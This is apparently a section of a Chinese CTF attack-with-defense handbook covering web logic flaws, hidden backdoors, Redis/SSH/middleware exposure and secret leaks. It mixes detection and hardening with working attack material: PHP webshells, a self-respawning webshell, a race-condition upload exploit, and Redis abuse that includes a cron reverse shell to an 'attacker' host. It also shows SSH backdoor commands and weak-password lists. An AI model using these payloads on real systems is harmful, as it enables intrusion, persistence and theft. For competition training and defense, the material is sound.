## 10. 逻辑漏洞

| 类型 | Payload/场景 | 防御 |
|------|-------------|------|
| 越权访问 | 修改 user_id=1 访问他人数据 | 后端校验 user_id 归属 |
| 支付逻辑 | 修改 price=0, amount=999 | 服务端校验金额 |
| 验证码绕过 | 前端校验、可预测随机数 | 服务端校验+随机种子 |
| 密码找回 | 改 email=attacker.com | 校验邮箱+短信双重验证 |
| 条件竞争 | 并发提现/抽奖 | 锁机制+事务 |
| 变量覆盖 | extract($_REQUEST) 覆盖敏感变量 | 避免 extract/parse_str |
| URL 跳转 | ?url=http://evil.com | 白名单跳转目标 |
| 订单号预测 | 遍历 order_id=1,2,3 | 使用 UUID+随机 |
| 登录逻辑 | 跳过验证码步骤 | 每步都校验 |

---

## 11. AWD 专属：隐藏后门专题

> **AWD 比赛开局第一件事**：源码中通常预埋后门，必须先排查再加固。本节覆盖 4 类典型后门及清除方法。

### 11.1 显性 Webshell（最易发现）

**特征**：直接以 `.php` 文件形式藏在上传目录、图片目录、配置目录。

**常见藏匿位置**：
```
/app/uploads/              # 上传目录
/app/avatar/               # 头像目录
/app/Runtime/Cache/        # ThinkPHP 缓存目录
/app/Runtime/Logs/         # 日志目录
/app/Public/               # 静态资源
/app/Install/              # 安装目录残留
/app/data/                 # 数据目录
/app/.config.php           # 隐藏文件 (点开头)
/app/1.php                 # 数字命名
/app/index.bak.php         # 备份后缀
```

**特征码扫描命令**：
```bash
# 一行扫所有可疑文件
find /app -type f \( -name "*.php" -o -name "*.phtml" -o -name "*.php5" -o -name "*.pht" \) \
  | xargs grep -lE "eval\s*\(|assert\s*\(|system\s*\(|passthru\s*\(|shell_exec\s*\(|popen\s*\(|create_function\s*\(|preg_replace.*/e"

# 配合项目自带脚本
python3 defense/backdoor_detector.py /app
```

**典型显性后门示例**：
```php
<?php @eval($_POST['cmd']); ?>                          // 经典一句话
<?php assert($_POST['cmd']); ?>                         // assert 变形
<?php $_GET['a']($_POST['b']); ?>                       // 动态函数
<?php preg_replace("/.*/e", $_POST['cmd'], ""); ?>      // preg_replace /e
<?php $a=str_replace("x","",$_POST['x']);$a($_POST['y']); ?>  // 字符串混淆
GIF89a<?php @eval($_POST['cmd']); ?>                    // 图片马
```

**清除**：直接 `rm -f` 即可，但要同步检查 crontab 是否有定时复活任务。

---

### 11.2 变量覆盖后门（隐蔽，易漏）

**特征**：出题人故意在源码中保留 `extract($_GET/$_POST/$_REQUEST)` 或 `parse_str()` 调用，允许攻击者覆盖关键变量。

**典型预埋位置**：
```php
// 危险模式 1: 全局 extract
extract($_REQUEST);          // ← 所有 GET/POST 变量直接注入当前作用域

// 危险模式 2: 配置覆盖
foreach ($_GET as $k => $v) $$k = $v;   // ← 可变变量, 任意覆盖

// 危险模式 3: parse_str
parse_str($_SERVER['QUERY_STRING']);    // ← 同上

// 危险模式 4: filter 链
$filter = $_GET['filter']; $filter($_GET['data']);  // ← 函数名可控
```

**利用示例（绕过登录认证）**：
```php
// 源码:
session_start();
$is_admin = false;
extract($_REQUEST);           // ← 后门: 攻击者可覆盖 $is_admin
if ($is_admin) { /* 显示 flag */ }

// 利用:
curl "http://target/admin.php?is_admin=1"
```

**利用示例（覆盖配置文件路径）**：
```php
$config_file = '/app/config.php';
extract($_REQUEST);           // ← 后门
require $config_file;

// 利用:
curl "http://target/index.php?config_file=/etc/passwd"
```

**检测命令**：
```bash
grep -rnE "extract\s*\(\s*\\\$_(GET|POST|REQUEST|COOKIE)" /app
grep -rnE "parse_str\s*\(\s*\\\$_(SERVER|GET|POST)" /app
grep -rnE 'foreach\s*\(\s*\\\$_(GET|POST|REQUEST).*as.*\$\$' /app
grep -rnE '\$\w+\s*=\s*\$_(GET|POST|REQUEST)' /app | grep -v "isset"
```

**清除**：
```php
// 把 extract($_REQUEST) 改成 extract($_REQUEST, EXTR_SKIP);
// 或直接删除该行, 显式列出需要的变量
$id = intval($_GET['id']);
$name = htmlspecialchars($_GET['name']);
```

---

### 11.3 条件竞争后门（极隐蔽）

**特征**：源码中有「先保存文件 → 校验 → 删除」的逻辑，攻击者在保存到删除的极短窗口内并发访问执行。

**典型预埋代码**：
```php
// upload.php
move_uploaded_file($_FILES['file']['tmp_name'], '/app/uploads/' . $_FILES['file']['name']);
// ← 攻击者在这个时间窗口内并发访问 /app/uploads/shell.php
if (!checkExt($_FILES['file']['name'])) {
    unlink('/app/uploads/' . $_FILES['file']['name']);
}
```

**利用脚本**（并发上传 + 并发访问）：
```python
import threading, requests
TARGET = "http://target/upload.php"
SHELL_URL = "http://target/uploads/shell.php"
SHELL = {'file': ('shell.php', '<?php echo "PWN";@eval($_POST["c"]);?>', 'image/jpeg')}

def upload():
    for _ in range(100):
        requests.post(TARGET, files=SHELL)

def access():
    for _ in range(1000):
        r = requests.get(SHELL_URL)
        if 'PWN' in r.text:
            print(f"[+] RACE WIN: {SHELL_URL}")
            return True
    return False

# 并发
threads = [threading.Thread(target=upload) for _ in range(20)] + \
          [threading.Thread(target=access) for _ in range(20)]
[t.start() for t in threads]
```

**检测**：找源码中 `move_uploaded_file` / `file_put_contents` / `fopen(..,'w')` 与 `unlink` / `rm` 之间的时序窗口。

**防御/清除**：
```php
// 1. 先校验再保存 (顺序反过来)
if (!checkExt($_FILES['file']['name'])) die('invalid');
$tmp = '/tmp/upload_' . uniqid();     // ← 存到非 Web 可访问目录
move_uploaded_file($_FILES['file']['tmp_name'], $tmp);
// 校验通过后再 rename 到正式目录
rename($tmp, '/app/uploads/' . $_FILES['file']['name']);

// 2. 文件名随机化 (攻击者猜不到 URL)
$filename = md5(uniqid() . rand()) . '.jpg';

// 3. 上传目录禁用 PHP
echo "php_flag engine off" > /app/uploads/.htaccess
```

---

### 11.4 不死马（内存马，极难清除）

**特征**：通过 `ignore_user_abort(true)` + `set_time_limit(0)` 创建无限循环，每隔几秒自动重新生成 Webshell 文件。即使你 `rm` 删了文件，几秒后又会出现。

**典型不死马代码**：
```php
<?php
ignore_user_abort(true);            // ← 即使客户端断开, PHP 继续执行
set_time_limit(0);                  // ← 永不超时
unlink(__FILE__);                   // ← 自删, 隐藏踪迹
$file = '/app/.hidden_shell.php';
$code = '<?php @eval($_POST["x"]);?>';
while (1) {
    file_put_contents($file, $code);
    usleep(5000);                   // ← 每 5ms 重新写一次
    // 进阶: 还会改名
    // $file = '/app/' . md5(rand()) . '.php';
}
```

**清除方法 1：重启 PHP-FPM（最有效）**
```bash
# 重启 PHP-FPM 会杀掉所有 PHP 进程, 不死马循环自然终止
service php-fpm restart
# 或
systemctl restart php7.4-fpm
pkill -9 php-fpm && service php-fpm start
```

**清除方法 2：Apache mod_php**
```bash
service apache2 restart
# 或
apachectl restart
```

**清除方法 3：脚本竞争删除（无法重启服务时）**
```bash
# 比不死马写得更快地删除 (需要 while 死循环)
while true; do
    find /app -name "*.php" -newer /tmp/baseline_marker ! -name "index.php" -delete 2>/dev/null
    rm -f /app/.hidden_shell.php /app/.config.php
    usleep 1000   # 1ms 一次, 比不死马 5ms 快
done
```

**清除方法 4：文件属性不可变（终极防御）**
```bash
# 把干净版本的文件加 +i 锁, 不死马写不进去
chattr +i /app/index.php /app/waf.php
# 想再修改时: chattr -i /app/index.php
```

**检测**：
```bash
# 1. 看进程: 大量 php-fpm worker CPU 占用高
ps aux | grep php-fpm | awk '$3 > 10 {print}'    # CPU>10%
top -bn1 | grep php

# 2. 看文件 mtime: 同一个文件被反复修改
watch -n 0.5 'stat /app/.hidden_shell.php'

# 3. 看磁盘写入: inotify 实时监控
inotifywait -mr /app -e create,modify 2>&1 | head -30

# 4. 看日志: PHP 错误日志可能有 unlink 失败的报错
tail -f /var/log/php_errors.log
```

**预防**：开局部署 WAF 后，立即把 `ignore_user_abort` 加入 `disable_functions`：
```ini
# /etc/php/*/fpm/php.ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,ignore_user_abort
```

---

## 12. 中间件与服务漏洞

### 12.1 Redis 未授权访问

**特征**：默认绑定 `0.0.0.0:6379` 且无密码保护。AWD 比赛中常出现在内网环境或 SSRF 内网探测场景。

**利用方式 1：写 SSH 公钥（拿到 SSH 权限）**
```bash
# 1. 攻击机生成密钥
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/pub.txt

# 2. 写入 Redis
redis-cli -h target flushall
cat /tmp/pub.txt | redis-cli -h target -x set ssh_key

# 3. 写到 /root/.ssh/authorized_keys
redis-cli -h target config set dir /root/.ssh/
redis-cli -h target config set dbfilename authorized_keys
redis-cli -h target save

# 4. 免密登录
ssh -i /tmp/redis_rsa root@target
```

**利用方式 2：写 Webshell（已知 Web 根目录）**
```bash
redis-cli -h target flushall
redis-cli -h target config set dir /app
redis-cli -h target config set dbfilename shell.php
redis-cli -h target set x "<?php @eval(\$_POST['c']);?>"
redis-cli -h target save
# 访问 http://target/shell.php
```

**利用方式 3：写计划任务（CentOS 适用，Ubuntu 失败）**
```bash
redis-cli -h target config set dir /var/spool/cron
redis-cli -h target config set dbfilename root
redis-cli -h target set x "\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n"
redis-cli -h target save
```

**利用方式 4：主从复制 RCE（Redis 4.x+）**
```bash
# 加载恶意 .so 模块
python redis-rogue-server.py --rhost target --lhost attacker
```

**防御（加固清单）**：
```bash
# 1. 绑定本地
sed -i 's/^bind .*/bind 127.0.0.1/' /etc/redis/redis.conf

# 2. 设密码
echo "requirepass Rds#2026\$tr0ng!Pass" >> /etc/redis/redis.conf

# 3. 改端口
sed -i 's/^port .*/port 6380/' /etc/redis/redis.conf

# 4. 禁危险命令
cat >> /etc/redis/redis.conf <<EOF
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command KEYS ""
EOF

# 5. 重启
service redis-server restart

# 6. iptables 封掉外部访问
iptables -A INPUT -p tcp --dport 6379 -j DROP
iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
```

---

### 12.2 SSH 弱口令与后门

**特征 1：弱口令**（默认/短密码）
```bash
# AWD 常见弱口令
admin/admin123, root/toor, root/123456, team1/team1
# 完整字典见 attack/brute_force.py
```

**特征 2：SSH 后门（出题人预埋或攻击者植入）**

```bash
# 后门类型 1: 软链接后门 (任意密码登录 root)
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345
# 利用: ssh root@target -p 12345  (输入任意密码)

# 后门类型 2: SSH wrapper 后门
# /tmp/.sshd 是包装过的 sshd, 接受特定密码
mv /usr/sbin/sshd /usr/sbin/sshd.bak
echo '#!/usr/bin/perl' > /usr/sbin/sshd
echo 'exec "/usr/sbin/sshd.bak" -o "AuthorizedKeysCommand /tmp/.backdoor.sh"' >> /usr/sbin/sshd
chmod +x /usr/sbin/sshd

# 后门类型 3: PAM 后门 (特定密码绕过)
# 修改 /etc/pam.d/sshd 加自定义认证模块

# 后门类型 4: authorized_keys 植入
echo "ssh-rsa AAAA...attacker.pub..." >> /root/.ssh/authorized_keys
```

**检测**：
```bash
# 1. 查异常监听端口
ss -tlnp | grep -vE ":22 |:80 |:443 |:3306 "
netstat -tlnp | grep -v "127.0.0.1"

# 2. 查 sshd 文件是否被替换
ls -la /usr/sbin/sshd /usr/sbin/sshd.bak /tmp/su /tmp/.sshd 2>/dev/null
file /usr/sbin/sshd     # 应该是 ELF, 不是脚本
rpm -V openssh-server 2>/dev/null || dpkg -V openssh-server 2>/dev/null

# 3. 查 authorized_keys 异常
cat ~/.ssh/authorized_keys 2>/dev/null     # 应该为空或只有自己的 key

# 4. 查 PAM 配置
grep -v "^#" /etc/pam.d/sshd | grep -v "^$"
```

**防御/清除**：
```bash
# 1. 清空 authorized_keys
> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 2. 杀掉异常 sshd 进程
ps -ef | grep -E "/tmp/su|/tmp/.sshd|/tmp/suid" | grep -v grep | awk '{print $2}' | xargs kill -9

# 3. 修复 sshd 软链接
[ -f /usr/sbin/sshd.bak ] && mv /usr/sbin/sshd.bak /usr/sbin/sshd

# 4. 改强密码 (注意: AWD 比赛不能改 SSH 密码, 否则失联! 只能改其他服务密码)
# 如果必须改, 务必先用新密码测试 SSH 能登录再断开当前会话

# 5. 加固 sshd_config
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config  # AWD 需要密码登录
service sshd restart

# 6. iptables 限制 SSH 来源
iptables -A INPUT -p tcp --dport 22 -s <你的IP> -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
```

---

### 12.3 其他常见中间件未授权

| 服务 | 默认端口 | 未授权危害 | 检测命令 | 防御 |
|------|---------|-----------|---------|------|
| **Memcached** | 11211 | 缓存数据泄露/篡改 | `echo stats \| nc target 11211` | `bind 127.0.0.1` + `-S` 启用 SASL |
| **MongoDB** | 27017 | 数据库完全控制 | `mongo --host target` | `auth=true` + bind 127.0.0.1 |
| **Elasticsearch** | 9200 | 数据泄露/RCE(脚本引擎) | `curl target:9200/_cat/indices` | `network.host: 127.0.0.1` + 开启 xpack |
| **Hadoop YARN** | 8088 | 任意命令执行 | `curl target:8088/ws/v1/cluster/info` | iptables 封 + Kerberos |
| **Docker API** | 2375 | 容器逃逸到宿主 RCE | `curl target:2375/containers/json` | 改用 2376+TLS / bind 127.0.0.1 |
| **Zookeeper** | 2181 | 配置泄露 | `echo envi \| nc target 2181` | enableAuth + ACL |
| **FTP** | 21 | 匿名上传 webshell | `ftp target` (用户名 anonymous) | `anonymous_enable=NO` |
| **rsync** | 873 | 任意文件读写 | `rsync target::` | `/etc/rsyncd.conf` 加 `auth users` |
| **NFS** | 2049 | 文件系统挂载 | `showmount -e target` | `/etc/exports` 限制 IP + `no_root_squash` |

---

## 13. 硬编码与敏感信息泄露

### 13.1 硬编码密码/Flag

**AWD 出题人常见埋雷位置**：
```php
// 1. 数据库配置文件 (最常见)
// /app/App/Common/Conf/db.php
return array(
    'DB_TYPE' => 'mysql',
    'DB_HOST' => 'localhost',
    'DB_USER' => 'root',
    'DB_PWD'  => 'admin123',         // ← 弱密码硬编码
    'DB_NAME' => 'xyhcms',
);

// 2. 后台管理员密码 (md5 + 弱盐)
// /app/data/install.sql
INSERT INTO xy_admin VALUES (1, 'admin', 'e10adc3949ba59abbe56e057f20f883e', 'abc');
//                                                  ↑ md5(123456)          ↑ 弱盐

// 3. Cookie 加密 key
// /app/Common/Conf/config.php
'COOKIE_PREFIX' => 'xyh_',
'CRYPT_KEY'     => '123456',          // ← 弱 key, 可伪造 cookie

// 4. 直接写死的 flag (低级错误)
// /app/install.php
$flag = 'flag{this_is_a_test_flag}';
```

**检测命令**：
```bash
# 全局搜常见关键字
grep -rnE "(DB_PWD|DB_PASSWORD|password|passwd|pwd)\s*['\"]*\s*=>\s*['\"][^'\"]{3,}" /app --include="*.php"
grep -rnE "(flag|FLAG)\{[^}]+\}" /app --include="*.php"
grep -rnE "(CRYPT_KEY|SECRET_KEY|API_KEY|TOKEN)\s*['\"]*\s*=>\s*['\"][^'\"]{3,}" /app --include="*.php"

# 找 md5 弱哈希
grep -rnE "[a-f0-9]{32}" /app --include="*.php" | head
# 然后用 cmd5.com / somd5.com 反查

# 项目自带检测
python3 defense/vuln_fixer.py /app
```

**防御/清除**：
```bash
# 1. 改强密码 (用 PHP 脚本改, 避免 bash 解析 $)
php /tmp/fix_pass.php    # 见 defense_bootstrap.sh

# 2. 配置文件权限 640
find /app -name "db.php" -o -name "config.php" | xargs chmod 640

# 3. 移到 Web 根外
mv /app/App/Common/Conf/db.php /etc/awd/db.php
# 然后改 require 路径

# 4. 删除敏感残留
rm -rf /app/Install /app/data/install.sql /app/.git /app/.svn /app/.DS_Store /app/www.zip
```

---

### 13.2 源码/备份文件泄露

**常见泄露文件清单**：
```
/.git/                       # Git 仓库 (可还原源码)
/.svn/                       # SVN 仓库
/.hg/                        # Mercurial
/.bzr/                       # Bazaar
/.DS_Store                   # macOS 目录结构
/www.zip / www.tar.gz        # 整站备份
/backup.zip / backup.sql     # 数据库备份
/.env                        # Laravel / Symfony 环境变量
/phpinfo.php                 # 信息泄露
/Install/                    # 安装向导残留
/robots.txt                  # 可能暴露后台路径
/crossdomain.xml             # Flash 域配置
```

**检测命令**：
```bash
# 1. 直接 curl 探测
for p in .git/ .svn/ .env www.zip backup.zip backup.sql phpinfo.php Install/ .DS_Store; do
    code=$(curl -s -o /dev/null -w '%{http_code}' "http://target/$p")
    [ "$code" = "200" ] && echo "[+] $p (200)"
done

# 2. 用 dirsearch / ffuf 扫
python3 dirsearch.py -u http://target -e zip,tar.gz,bak,old,swp,git,svn,env

# 3. Git 仓库还原
# 如果 /.git/config 存在:
wget -r -p -np -k http://target/.git/
# 用 GitHack 还原
python2 GitHack.py http://target/.git/

# 4. .env 文件
curl http://target/.env
# 典型内容:
# DB_PASSWORD=secret
# APP_KEY=base64:xxxxx
# REDIS_PASSWORD=
```

**防御/清除**：
```bash
# 1. 删除所有敏感文件
rm -rf /app/.git /app/.svn /app/.hg /app/.bzr /app/.DS_Store
rm -rf /app/Install /app/www.zip /app/backup.* /app/*.sql /app/.env

# 2. 配置 Apache/Nginx 拒绝访问
# Apache (.htaccess)
echo '<FilesMatch "\.(git|svn|env|sql|bak|swp)$">
  Require all denied
</FilesMatch>' > /app/.htaccess

# Nginx (nginx.conf)
# location ~ /\.(git|svn|env|sql|bak|swp) { deny all; }

# 3. 禁止访问点开头目录
echo 'RedirectMatch 404 /\..*$' >> /app/.htaccess
```

---

### 13.3 phpinfo 信息泄露

**危害**：暴露绝对路径、PHP 版本、已加载模块、disable_functions、`$_SERVER` 中的敏感环境变量。

**利用**：
```bash
curl http://target/phpinfo.php | grep -E "DOCUMENT_ROOT|disable_functions|_ENV|PASSWORD"
```

**防御**：
```bash
rm -f /app/phpinfo.php /app/info.php /app/test.php /app/pi.php
# 同时在 WAF 中加规则拦截 phpinfo 关键字 (见 defense/waf.php 第 9 类规则)
```

---

## 附录：Web 工具清单

| 工具 | 用途 |
|------|------|
| Burp Suite | 综合 Web 测试（Repeater/Intruder/Decoder） |
| sqlmap | SQL 注入自动化 |
| nuclei | 漏洞扫描 |
| dirsearch / ffuf / gobuster | 目录/文件爆破 |
| wappalyzer / whatweb | 指纹识别 |
| httpx | HTTP 批量探测 |
| arjun | HTTP 参数发现 |
| Commix | 命令注入检测 |
| SSRFmap | SSRF 漏洞利用 |
| XSStrike | XSS 自动检测 |
| phpggc | PHP 反序列化链生成 |
| ysoserial | Java 反序列化 |
| Semgrep | 静态代码分析 |
| Retire.js | JS 漏洞扫描 |
| Nuclei | 漏洞扫描模板引擎 |
| Wfuzz | Web 模糊测试 |